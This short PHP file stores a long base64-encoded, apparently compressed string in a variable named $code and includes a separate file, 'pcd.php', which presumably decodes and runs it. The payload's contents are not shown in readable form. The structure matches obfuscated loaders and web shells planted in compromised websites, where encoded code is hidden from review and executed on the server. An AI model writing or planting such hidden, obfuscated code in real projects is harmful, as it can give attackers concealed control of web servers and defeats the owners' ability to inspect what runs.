<?php
$code="s7EvyCjgykxT0EjLzEmNT63ILC4p1lDS09NPSdU3rkjOLdZPzs9Ly0wHUXnxmXnJekANSpqaCtUKQE5OaUoqEaqtFWoVUnOKU7HZQ5TxOE1VAQmlJpdk5udlptiqFBfmWCsAAA==";include("pcd.php");?>